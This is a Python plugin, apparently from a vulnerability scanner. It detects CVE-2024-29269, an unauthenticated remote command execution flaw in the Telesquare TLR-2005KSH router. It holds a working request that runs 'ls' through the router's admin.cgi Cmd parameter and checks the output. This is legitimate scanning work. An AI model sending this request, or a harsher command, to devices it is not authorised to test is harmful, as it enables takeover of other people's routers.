"""Agent Asteroid implementation for CVE-2024-29269"""

import re

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = (
    "Telesquare TLR-2005KSH Unauthorized Remote Command Execution Vulnerability"
)
VULNERABILITY_REFERENCE = "CVE-2024-29269"
VULNERABILITY_DESCRIPTION = (
    "Telesquare Tlr-2005Ksh is a Sk Telecom Lte router from South Korea's Telesquare company.Telesquare TLR-2005Ksh "
    "versions 1.0.0 and 1.1.4 have an unauthorized remote command execution vulnerability. An attacker can exploit "
    "this vulnerability to execute system commands without authorization through the Cmd parameter and obtain server "
    "permissions."
)
RISK_RATING = "CRITICAL"


@exploits_registry.register
class CVE202429269Exploit(webexploit.WebExploit):
    accept_request = definitions.Request(method="GET", path="/")
    check_request = definitions.Request(
        method="GET", path="/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ls"
    )
    accept_pattern = [re.compile("TLR-2005KSH")]
    match_pattern = [
        re.compile("<CmdResult><!\[CDATA\[systemutil.cgi\n\]\]></CmdResult>")
    ]
    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        cve_ids=["CVE-2024-29269"],
    )
